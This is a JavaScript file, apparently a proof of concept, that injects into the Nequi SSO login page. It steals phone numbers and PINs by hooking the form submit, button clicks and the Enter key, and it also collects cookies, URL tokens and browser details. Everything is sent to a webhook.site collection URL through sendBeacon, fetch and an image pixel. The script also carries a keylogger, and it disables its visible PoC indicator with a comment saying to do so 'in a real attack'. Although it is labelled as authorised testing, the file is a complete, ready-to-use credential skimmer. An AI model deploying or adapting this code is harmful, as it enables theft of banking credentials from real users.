// PoC Phishing Perfecto - Nequi SSO
// Solo para pruebas de seguridad autorizadas
// Este script demuestra cómo un atacante podría robar credenciales

(function () {
	"use strict";

	// ============================================
	// CONFIGURACIÓN DEL ATACANTE
	// ============================================
	const ATTACKER_SERVER = "https://webhook.site/ad792d40-113f-460e-ad72-0c25292474d8";

	// ============================================
	// 1. INTERCEPTAR EL FORMULARIO
	// ============================================
	function hijackForm() {
		// Esperar a que el DOM esté listo
		const checkForm = setInterval(function () {
			const form = document.querySelector("form");
			const phoneInput = document.querySelector(
				'input[type="tel"], input[name="username"], input[placeholder*="celular"]'
			);
			const pinInput = document.querySelector('input[type="password"], input[name="password"]');
			const submitBtn = document.querySelector(
				'button[type="submit"], button.entra, button:contains("Entra")'
			);

			if (form || (phoneInput && pinInput)) {
				clearInterval(checkForm);
				console.log("[PHISH] Formulario detectado, instalando interceptor...");
				installInterceptor(form, phoneInput, pinInput, submitBtn);
			}
		}, 100);
	}

	// ============================================
	// 2. INSTALAR INTERCEPTOR DE CREDENCIALES
	// ============================================
	function installInterceptor(form, phoneInput, pinInput, submitBtn) {
		// Buscar inputs si no se pasaron
		if (!phoneInput) {
			phoneInput =
				document.querySelector('input[type="tel"]') ||
				document.querySelector('input[name="username"]') ||
				document.querySelectorAll("input")[0];
		}
		if (!pinInput) {
			pinInput =
				document.querySelector('input[type="password"]') || document.querySelector('input[name="password"]');
		}

		// Método 1: Interceptar evento submit del formulario
		if (form) {
			form.addEventListener(
				"submit",
				function (e) {
					captureAndSend(phoneInput, pinInput);
					// NO prevenimos el submit - el login continúa normalmente
				},
				true
			);
		}

		// Método 2: Interceptar click en botón de submit
		const buttons = document.querySelectorAll("button");
		buttons.forEach(function (btn) {
			if (btn.textContent.toLowerCase().includes("entra") || btn.type === "submit") {
				btn.addEventListener(
					"click",
					function (e) {
						captureAndSend(phoneInput, pinInput);
					},
					true
				);
			}
		});

		// Método 3: Interceptar Enter en campos
		[phoneInput, pinInput].forEach(function (input) {
			if (input) {
				input.addEventListener("keypress", function (e) {
					if (e.key === "Enter") {
						captureAndSend(phoneInput, pinInput);
					}
				});
			}
		});

		console.log("[PHISH] Interceptores instalados correctamente");
	}

	// ============================================
	// 3. CAPTURAR Y ENVIAR CREDENCIALES
	// ============================================
	function captureAndSend(phoneInput, pinInput) {
		const credentials = {
			// Credenciales
			telefono: phoneInput ? phoneInput.value : "NO_CAPTURADO",
			pin: pinInput ? pinInput.value : "NO_CAPTURADO",

			// Metadata
			timestamp: new Date().toISOString(),
			url: window.location.href,
			dominio: document.domain,
			referrer: document.referrer,

			// Info del navegador
			userAgent: navigator.userAgent,
			plataforma: navigator.platform,
			idioma: navigator.language,
			pantalla: screen.width + "x" + screen.height,

			// Cookies disponibles
			cookies: document.cookie,

			// Tokens en la URL
			urlParams: Object.fromEntries(new URLSearchParams(window.location.search)),
		};

		console.log("[PHISH] Credenciales capturadas:", credentials);

		// Método 1: sendBeacon (más confiable, no bloquea)
		try {
			navigator.sendBeacon(ATTACKER_SERVER, JSON.stringify(credentials));
			console.log("[PHISH] Enviado via sendBeacon");
		} catch (e) {
			console.log("[PHISH] sendBeacon falló:", e);
		}

		// Método 2: Fetch con no-cors (backup)
		try {
			fetch(ATTACKER_SERVER, {
				method: "POST",
				body: JSON.stringify(credentials),
				mode: "no-cors",
				headers: { "Content-Type": "application/json" },
			});
			console.log("[PHISH] Enviado via fetch");
		} catch (e) {
			console.log("[PHISH] fetch falló:", e);
		}

		// Método 3: Imagen pixel (último recurso)
		try {
			const pixel = new Image();
			const params = encodeURIComponent(btoa(JSON.stringify(credentials)));
			pixel.src = ATTACKER_SERVER + "?data=" + params;
			console.log("[PHISH] Enviado via pixel");
		} catch (e) {
			console.log("[PHISH] pixel falló:", e);
		}
	}

	// ============================================
	// 4. KEYLOGGER ADICIONAL (OPCIONAL)
	// ============================================
	function installKeylogger() {
		let keyBuffer = "";

		document.addEventListener("keypress", function (e) {
			// Solo capturar en campos de input
			if (e.target.tagName === "INPUT") {
				keyBuffer += e.key;

				// Enviar cada 10 caracteres
				if (keyBuffer.length >= 10) {
					sendKeylog(keyBuffer);
					keyBuffer = "";
				}
			}
		});

		// Enviar buffer al salir de la página
		window.addEventListener("beforeunload", function () {
			if (keyBuffer.length > 0) {
				sendKeylog(keyBuffer);
			}
		});
	}

	function sendKeylog(keys) {
		const data = {
			type: "keylog",
			keys: keys,
			timestamp: Date.now(),
			url: location.href,
		};
		navigator.sendBeacon(ATTACKER_SERVER, JSON.stringify(data));
	}

	// ============================================
	// 5. INDICADOR VISUAL (SOLO PARA POC/DEBUG)
	// ============================================
	function showPocIndicator() {
		const indicator = document.createElement("div");
		indicator.id = "phish-poc-indicator";
		indicator.innerHTML = "🎣 POC PHISHING ACTIVO - Las credenciales serán capturadas";
		indicator.style.cssText = `
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(255, 0, 64, 0.9);
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            z-index: 999999;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        `;
		document.body.appendChild(indicator);

		// Auto-ocultar después de 5 segundos
		setTimeout(function () {
			indicator.style.opacity = "0.3";
		}, 5000);
	}

	// ============================================
	// 6. INICIALIZACIÓN
	// ============================================
	function init() {
		console.log("==========================================");
		console.log("[PHISH] PoC Phishing Perfecto Iniciado");
		console.log("[PHISH] Dominio:", document.domain);
		console.log("[PHISH] URL:", window.location.href);
		console.log("==========================================");

		// Iniciar captura
		hijackForm();

		// Keylogger adicional
		installKeylogger();

		// Mostrar indicador (comentar en ataque real)
		// showPocIndicator();
	}

	// Ejecutar cuando el DOM esté listo
	if (document.readyState === "loading") {
		document.addEventListener("DOMContentLoaded", init);
	} else {
		init();
	}
})();
